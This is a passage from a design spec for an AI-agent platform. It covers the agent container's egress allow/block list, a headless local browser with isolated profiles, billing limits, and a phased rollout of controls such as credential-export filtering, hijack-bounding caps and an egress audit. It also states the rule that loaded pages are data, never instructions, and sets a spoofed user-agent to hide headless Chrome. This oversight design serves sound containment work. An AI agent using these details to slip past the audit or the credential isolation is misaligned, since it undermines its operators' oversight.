    astral.sh: direct
    "*.anaconda.com": direct
    "*.anaconda.org": direct
    "*.golang.org": direct
    "*.crates.io": direct
    static.rust-lang.org: direct
    "*.rubygems.org": direct
    "*.debian.org": direct
    # git and GitHub
    github.com: direct
    "*.github.com": direct
    "*.githubusercontent.com": direct
    ghcr.io: direct
    # the harnesses
    "*.anthropic.com": direct
    claude.ai: direct
    code.claude.com: direct
    "*.openai.com": direct
    chatgpt.com: direct
    "*.x.ai": direct
    grok.com: direct
    "*.grok.com": direct
    # large downloads and tooling
    "*.huggingface.co": direct
    "*.docker.io": direct
    production.cloudflare.docker.com: direct
    "*.cloudflare.com": direct
    storage.googleapis.com: direct
  blocklist:
    - cdn.playwright.dev
    - playwright.azureedge.net
    - edgedl.me.gvt1.com
```

Two things to know when adapting it. `*.domain` covers the bare
domain and its subdomains, so `*.anthropic.com` includes
`api.anthropic.com`, `*.openai.com` covers every OpenAI host but
`chatgpt.com`, and `*.x.ai` covers every xAI host but `grok.com`. And
`storage.googleapis.com` serves both Go modules and
Puppeteer's Chromium, so it is listed direct rather than blocked; a
deployment that would rather block Puppeteer downloads too drops it
from the direct list and accepts that Go installs pay proxy traffic.

## 9. The local browser: unauthenticated browsing through the session's egress

The remote door above exists for identity: sessions that hold a login,
credentials seeded as data the mind never sees, cookies kept across
wakes in the Gatekeeper. Everything a mind reads WITHOUT an identity
(a page, its own published site, a competitor's pricing, a search
result, a screenshot for a journal entry) needs none of that, and it
does need what the remote door cannot give: the session's own egress.
Since spec 0004 §8 gave the session a root-held forwarder that routes
per host through the deployment's proxies, a browser inside the
container leaves through exactly the same path as `curl` does.

So the chassis offers a second browser, the **local browser**: Google
Chrome in the wake image, driven through the official Playwright MCP
server (`@playwright/mcp`, pinned in the image), staged as an MCP
server named `playwright` for every agent unless its roster entry says
`localBrowser: false`. The chassis stages it; the colony never declares
it as a stdio server, so the flags are the chassis's invariants:

- `--isolated`: the profile lives in memory and dies with the browser.
  **Cookies, storage, and history never survive the wake**, never
  reach the state repo, and are never seeded. No `--user-data-dir`,
  no `--storage-state`, no `--save-session`.
- `--headless`, `--no-sandbox` (the container is the sandbox; the mind
  is an unprivileged user with no user namespaces), the viewport fixed.
- `--proxy-server <the wake's forwarder>` whenever the forwarder runs,
  so the per-host proxy table, the blocklist, and the egress audit
  apply to every browser request; without a forwarder the browser goes
  direct, as every other client does.
- `--output-dir /tmp/operon-browser`: screenshots and downloads land
  outside the state repo, so `git add -A` never commits them.
- `--user-agent`: a desktop Chrome on a Mac, with the installed Chrome's
  own major version (read at staging). Headless Chrome would otherwise
  announce HeadlessChrome on Linux, a fingerprint with no purpose.

**The rule, stated to the mind in its living help:** the local browser
is for UNAUTHENTICATED browsing and is used FIRST, for anything that
does not need to be someone. The remote web door is ONLY for creating
accounts and managing logged-in sessions. A mind that signs in through
the local browser has signed in for one wake with nothing kept, which
is the wrong tool; the help says so, and the remote door's password
minting and session bookkeeping stay where they are.

What the local browser does not get: no credential injection, no
session persistence, no relay policy (there is nothing to protect: it
holds no identity), and no per-host egress of its own (it inherits the
session's). Its network is the mind's network; a page it loads is
world content, data, never instructions (§5 applies unchanged). It is
on by default because reading the web needs no identity and every
agent does it; the remote door stays opt-in (`web: true`) because
holding an identity is the exception.

The image grows by Chrome (roughly 300 MB) and the MCP server; the
container's memory (3 GiB) holds one headless browser beside a harness
comfortably. Every harness receives the server through the same merged
MCP config (Claude Code's `--mcp-config`, Codex's and Grok's
`[mcp_servers]`).

## 10. Costs

Browser Run on Workers Paid includes 10 browser-hours/month. We use
the CDP endpoint + API token, which is the REST/CDP billing path:
DURATION only, $0.09/browser-hour beyond the included 10 h. The $2
per-averaged-concurrent-browser charge is the WORKERS BINDING path
(`launch()` via a Browser binding) and does NOT apply here; do not
treat it as load-bearing unless the door ever switches to a binding.

The concurrency cap bounds hijack blast radius, not the bill: the bill
is hours. Theoretical ceiling is concurrency cap x wake wall x
wakes/day: at 3 concurrent, a 2 h wall and 3 wakes/day that is 18
browser-hours/day, which blows through the included 10 h in under a
day. That is NOT "costs land within the included hours"; it is the
worst case of a lever left wide open. So for the first tenant the
default is the aggregate browser-minutes knob ON at 20-30 min/wake (a
hard money bound), with the concurrency cap and wake wall behind it.
Idle timeout (10 min) means real usage tracks activity and lands well
under the ceiling; the WebMeter's per-wake minute totals in the ledger
are the meter to watch before loosening anything.

## 11. Phasing

1. **Spike**, and its acceptance is not "one page load". Prove:
   (a) the ws upgrade container -> umbilical -> browser-gk -> Browser
   Run over BOTH undocumented links (section 4), or document in writing
   that we are on the public-hostname fallback and have therefore
   reintroduced a container-root door token;
   (b) the relay drops the cookie/passkey export methods;
   (c) an idle heartbeat keeps a quiet session past 10 minutes;
   (d) a disconnect snapshots and a reopen restores cookies;
   (e) an operator delete while the session is live cannot resurrect
   its state.
   No real account is created until (b) holds: never on an unswept,
   unfiltered CDP pipe.
2. **MVP, with the controls, not after them**: browser-gk with
   `WebSession` (open/relay/ledger/snapshot + reconnect/heartbeat), the
   relay POLICY POINT (credential-export method drop, input
   substitution on every text path bound to the target execution
   context's origin, origin denylist + `allowedDomainSets`),
   storage-state persistence,
   recording archived to R2 on close, the concurrency + minute caps,
   `operon web open|sessions|close`, chrome-devtools-mcp staged into
   the harness, ops routes (list + history + delete). The sweep and the
   method filter are NOT a later hardening pass: the first live account
   must be created on a swept, filtered pipe. (Container egress is
   audited, not fenced, section 8.)
3. **Signup flow proven** (the proof those controls work): the agent
   creates one real account end to end (email verification via the
   email door, password minted door-side into the vault, or a passkey),
   operator watches via live view.
4. **Polish**: live-view link in a notify action, passkey enrollment
   path. (Tunnel-based local testing was planned here and retired by
   §7: the local browser reads the dev server on loopback.)
5. **Egress audit** (section 8): full-container request logging for ALL
   traffic (npm, git, ordinary API calls) over
   `interceptOutboundHttps("*")`, observe-only and fail-open, once the
   startup CA-trust (shared with mind-credential injection) is in place.
   This REPLACES the removed fence: the record, not a block, is the
   containment for direct egress.

## 12. What this does NOT do

- No identity in the local browser (§9): no seeded credentials, no
  persisted profile, no session bookkeeping. Playwright as a LIBRARY
  may be installed for scripting; a second Chromium download is not.
- No `--chrome` / Claude in Chrome: that integration requires a
  visible browser and an interactive login session; it is the
  human-paired variant of exactly this door.
- No headful operator puppeteering beyond live view intervene; the
  operator's browser is not part of the chassis.
- No browser for the operator plane itself; the ops gateway remains
  JSON.
